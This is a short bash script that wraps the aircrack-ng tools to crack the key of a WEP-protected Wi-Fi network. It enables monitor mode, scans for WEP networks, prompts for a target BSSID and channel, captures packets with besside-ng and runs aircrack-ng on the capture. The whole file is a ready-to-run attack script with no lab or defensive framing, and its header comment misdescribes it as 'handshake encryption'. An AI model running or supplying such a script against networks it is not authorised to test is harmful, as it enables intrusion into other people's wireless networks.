#!/bin/bash

# WEP handshake encryption

echo ' '

read -p '[?] Enter name interface : ' Interface

airmon-ng start $Interface

MON=mon
airodump-ng $Interface$MON --encrypt WEP

read -p '[?] Enter BSSID : ' BSSID
read -p '[?] Enyer CHANNL : ' CHANNL

besside-ng $Interface$MON -c $CHANNL -b $BSSID

aircrack-ng ./wep.cap

airmon-ng stop $Interface$MON